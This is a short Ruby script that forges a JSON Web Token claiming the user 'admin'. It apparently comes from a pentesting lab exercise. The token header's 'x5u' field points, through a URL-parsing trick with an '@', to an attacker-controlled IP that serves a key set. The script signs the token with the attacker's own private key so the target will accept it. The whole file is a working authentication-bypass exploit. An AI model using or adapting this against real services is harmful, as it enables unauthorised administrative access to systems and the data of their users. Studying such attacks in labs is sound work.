require 'openssl'
require 'base64'
require 'json'


header = {"typ":"JWT","alg":"RS256","x5u":"http://ptl-4d8428eb-4d11ccc4.libcurl.so@95.136.73.97/jwks_with_x5c.json"}
payload = {"user":"admin"}

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")
token+= "."+Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")

sign = priv.sign("SHA256", token)
token+= "."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

puts token

